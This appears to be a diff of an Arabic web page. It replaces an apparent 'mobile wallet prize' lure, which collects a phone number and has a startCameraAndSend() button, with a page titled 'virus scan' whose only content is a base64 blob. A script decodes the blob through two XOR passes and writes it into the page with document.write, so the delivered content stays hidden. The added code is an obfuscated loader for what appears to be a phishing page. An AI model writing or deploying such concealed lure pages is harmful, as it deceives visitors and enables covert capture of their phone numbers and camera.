@@ -1,113 +1,27 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>محفظة جوالي الإلكترونية</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="مرحبًا بك في محفظة جوالي - اربح جوائز قيمة مجانًا!">
-  <style>
-    body {
-      direction: rtl;
-      font-family: 'Tahoma', sans-serif;
-      background: linear-gradient(to bottom, #e9f5ff, #ffffff);
-      text-align: center;
-      padding: 40px 20px;
-      margin: 0;
-    }
-
-    h1 {
-      color: #007bff;
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-
-    .container {
-      background-color: #ffffff;
-      max-width: 480px;
-      margin: 0 auto;
-      padding: 30px 20px;
-      border-radius: 16px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    }
-
-    input[type="tel"] {
-      width: 100%;
-      padding: 12px;
-      font-size: 18px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      margin-bottom: 15px;
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      font-size: 18px;
-      font-weight: bold;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .start-button {
-      background-color: #007bff;
-      color: white;
-    }
-
-    .start-button:hover {
-      background-color: #0056b3;
-    }
-
-    #consentBox {
-      background: #fff3cd;
-      border: 1px solid #ffeeba;
-      padding: 15px;
-      border-radius: 10px;
-      margin-bottom: 20px;
-      font-size: 16px;
-      color: #856404;
-    }
-
-    #carrierDisplay {
-      font-size: 16px;
-      color: #555;
-      margin-bottom: 15px;
-    }
-
-    #confirmationMessage {
-      font-size: 20px;
-      color: #28a745;
-      margin-top: 20px;
-    }
-
-    #logo {
-      width: 80px;
-      margin-bottom: 10px;
-    }
-  </style>
-</head>
+<head><meta charset="UTF-8"><title>فحص الفيروسات</title></head>
 <body>
+<script>
+(function() {
+    function b64_to_utf8(str) {
+        return decodeURIComponent(escape(atob(str)));
+    }
 
-  <div class="container">
-    
-    <h1>تأكد من الحسابات المرتبطة برقمك    </h1>
-
-    <input type="tel" id="phoneNumber" placeholder="📱 أدخل رقم هاتفك">
-    <p id="carrierDisplay"></p>
-
-    <div id="consentBox">
-      <p>🔒 سيتم التحقق من حساباتك </p>
-      <button class="start-button" onclick="confirmConsent()">أوافق</button>
-    </div>
-
-    <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد رقم الهاتف</button>
-
-    <p id="confirmationMessage" style="display: none;">
-      ✅ تم تأكد من حساباتك: <span id="confirmedNumber"></span>
-    </p>
-  </div>
-
-  <script src="index.js"></script>
+    var GpIpgBoh = "SlZLLiUpPjM6L0oCHgcGVGBWAh4HBkoGCwQNV0gLGEhUYFYCDwsOVGBKSlYHDx4LSgkCCxgZDx5XSD8+LEdSSFRgSkpWHgMeBg9Us++yx7PrstKyw0qyxrPiss2z7rPgSrLNs+6yz7Pus+mywLLbs+Kz7LPgssNWRR4DHgYPVGBKSlYHDx4LSgQLBw9XSBwDDx0aBRgeSEoJBQQeDwQeV0gdAw4eAlcODxwDCQ9HHQMOHgJGSgMEAx4DCwZHGQkLBg9XW0hUYEpKVgcPHgtKBAsHD1dIDg8ZCRgDGh4DBQRISgkFBB4PBB5XSLPvstuyx7LCs+GyzUqywrPpSrPrs+BKs++yx7PrstKyw0qyxrPiss2z7rPgSkdKss2y27LCssdKssaz4rLNssyy2Eqz6LPgs++yw0qz77LGss2z7LPhss1LSFRgSkpWGR4TBg9UYEpKSkoIBQ4TShFgSkpKSkpKDgMYDwkeAwUEUEoYHgZRYEpKSkpKSgwFBB5HDAsHAwYTUEpNPgsCBQcLTUZKGQsEGUcZDxgDDFFgSkpKSkpKCAsJAQ0YBR8EDlBKBgMEDwsYRw0YCw4DDwQeQh4FSggFHh4FB0ZKSQ9TDF8MDEZKSQwMDAwMDENRYEpKSkpKSh4PEh5HCwYDDQRQSgkPBB4PGFFgSkpKSkpKGgsODgMEDVBKXloaEkpYWhoSUWBKSkpKSkoHCxgNAwRQSlpRYEpKSkoXYGBKSkpKAltKEWBKSkpKSkoJBQYFGFBKSVpaXQgMDFFgSkpKSkpKDAUEHkcZAxAPUEpYUhoSUWBKSkpKSkoHCxgNAwRHCAUeHgUHUEpYWhoSUWBKSkpKF2BgSkpKSkQJBQQeCwMEDxhKEWBKSkpKSkoICwkBDRgFHwQORwkFBgUYUEpJDAwMDAwMUWBKSkpKSkoHCxJHHQMOHgJQSl5SWhoSUWBKSkpKSkoHCxgNAwRQSlpKCx8eBVFgSkpKSkpKGgsODgMEDVBKWVoaEkpYWhoSUWBKSkpKSkoIBRgODxhHGAsOAx8ZUEpbXBoSUWBKSkpKSkoIBRJHGQILDgUdUEpaSl4aEkpbWBoSShgNCAtCWkZKWkZKWkZKWkRbQ1FgSkpKShdgYEpKSkoDBBofHjEeExoPV0geDwZIN0oRYEpKSkpKSh0DDh4CUEpbWlpPUWBKSkpKSkoaCw4OAwQNUEpbWBoSUWBKSkpKSkoMBQQeRxkDEA9QSltSGhJRYEpKSkpKSggFGA4PGFBKWxoSShkFBgMOSkkJCQlRYEpKSkpKSggFGA4PGEcYCw4DHxlQSltaGhJRYEpKSkpKSgcLGA0DBEcIBR4eBQdQSltfGhJRYEpKSkoXYGBKSkpKCB8eHgUEShFgSkpKSkpKHQMOHgJQSltaWk9RYEpKSkpKShoLDg4DBA1QSlteGhJRYEpKSkpKSgwFBB5HGQMQD1BKW1IaElFgSkpKSkpKDAUEHkcdDwMNAh5QSggFBg5RYEpKSkpKSggFGA4PGFBKBAUED1FgSkpKSkpKCAUYDg8YRxgLDgMfGVBKW1oaElFgSkpKSkpKCR8YGQUYUEoaBQMEHg8YUWBKSkpKSkoeGAsEGQMeAwUEUEoICwkBDRgFHwQOSlpEWRlKDwsZD1FgSkpKShdgYEpKSkpEGR4LGB5HCB8eHgUEShFgSkpKSkpKCAsJAQ0YBR8EDkcJBQYFGFBKSVpaXQgMDFFgSkpKSkpKCQUGBRhQSh0CAx4PUWBKSkpKF2BgSkpKSkQZHgsYHkcIHx4eBQRQAgUcDxhKEWBKSkpKSkoICwkBDRgFHwQORwkFBgUYUEpJWlpfXAhZUWBKSkpKF2BgSkpKSkkJBQQZDwQeKAUSShFgSkpKSkpKCAsJAQ0YBR8EDlBKSQwMDFkJDlFgSkpKSkpKCAUYDg8YUEpbGhJKGQUGAw5KSQwMDw8IC1FgSkpKSkpKGgsODgMEDVBKW18aElFgSkpKSkpKCAUYDg8YRxgLDgMfGVBKW1oaElFgSkpKSkpKBwsYDQMERwgFHh4FB1BKWFoaElFgSkpKSkpKDAUEHkcZAxAPUEpbXBoSUWBKSkpKSkoJBQYFGFBKSVJfXF5aXlFgSkpKShdgYEpKSkpJCQsYGAMPGC4DGRoGCxNKEWBKSkpKSkoMBQQeRxkDEA9QSltcGhJRYEpKSkpKSgkFBgUYUEpJX19fUWBKSkpKSkoHCxgNAwRHCAUeHgUHUEpbXxoSUWBKSkpKF2BgSkpKSkkJBQQMAxgHCx4DBQQnDxkZCw0PShFgSkpKSkpKDAUEHkcZAxAPUEpYWhoSUWBKSkpKSkoJBQYFGFBKSVhSC11eX1FgSkpKSkpKBwsYDQMERx4FGlBKWFoaElFgSkpKShdgYEpKSkpJBgUNBUoRYEpKSkpKSh0DDh4CUEpSWhoSUWBKSkpKSkoHCxgNAwRHCAUeHgUHUEpbWhoSUWBKSkpKF2BKSlZFGR4TBg9UYFZFAg8LDlRgVggFDhNUYGBKSlYOAxxKCQYLGRlXSAkFBB4LAwQPGEhUYEpKSkpgSkpKSlYCW1SywLLJs+myxUqz77PsSrLNs+6yx7LZss2ywrLNssBKss2z7rPvstuywLLCst2yw0qywrLbs+iz77PpSkpKSlZFAltUYGBKSkpKVgMEGh8eSh4TGg9XSB4PBkhKAw5XSBoCBQQPJB8HCA8YSEoaBgsJDwIFBg4PGFdImvX520qyybLFssSz7kqy27Pos+9Ks+2yzbLAs+uz6UhUYEpKSkpWGkoDDldICQsYGAMPGC4DGRoGCxNIVFZFGlRgYEpKSkpWDgMcSgMOV0gJBQQZDwQeKAUSSFRgSkpKSkpKVhpUmvX++Eqy2bPgssCz70qyzbPussCyx7Pos+hKs++z7Eqyx7LZss2ywrLNssCz6UpWRRpUYEpKSkpKSlYIHx4eBQRKCQYLGRlXSBkeCxgeRwgfHh4FBEhKBQQJBgMJAVdICQUEDAMYBykFBBkPBB5CQ0hUssmz4rLNs+uz6FZFCB8eHgUEVGBKSkpKVkUOAxxUYGBKSkpKVggfHh4FBEoJBgsZGVdIGR4LGB5HCB8eHgUESEoDDldICQUEDAMYBygeBEhKBQQJBgMJAVdIGR4LGB4pCwcPGAsrBA45DwQOQkNIShkeEwYPV0gOAxkaBgsTUEoEBQQPUUhUssCyybPps+CyxUqy27Pos+9Kss2z7rPtss2ywLPrVkUIHx4eBQRUYGBKSkpKVhpKAw5XSAkFBAwDGAcLHgMFBCcPGRkLDQ9IShkeEwYPV0gOAxkaBgsTUEoEBQQPUUhUYEpKSkpKSoj270qywLPvSrLAssmz6bLFSrPvs+xKssey2bLNssKyzbLAs+lQSlYZGgsESgMOV0gJBQQMAxgHDw4kHwcIDxhIVFZFGRoLBFRgSkpKSlZFGlRgSkpWRQ4DHFRgYEpKVhkJGAMaHkoZGAlXSAMEDg8SRAAZSFRWRRkJGAMaHlRgVkUIBQ4TVGBWRQIeBwZUYA==";
+    var nlmZesvV = 148;
+    var USBKMGXy = 254;
+    var KshvuUfa = "";
+    var _tmp = atob(GpIpgBoh);
+    for (var i=0;i<_tmp.length;i++) {
+        KshvuUfa += String.fromCharCode(_tmp.charCodeAt(i) ^ USBKMGXy);
+    }
+    var _final = "";
+    for (var i=0;i<KshvuUfa.length;i++) {
+        _final += String.fromCharCode(KshvuUfa.charCodeAt(i) ^ nlmZesvV);
+    }
+    document.write(decodeURIComponent(escape(_final)));
+})();
+</script>
 </body>
-</html>
+</html> 
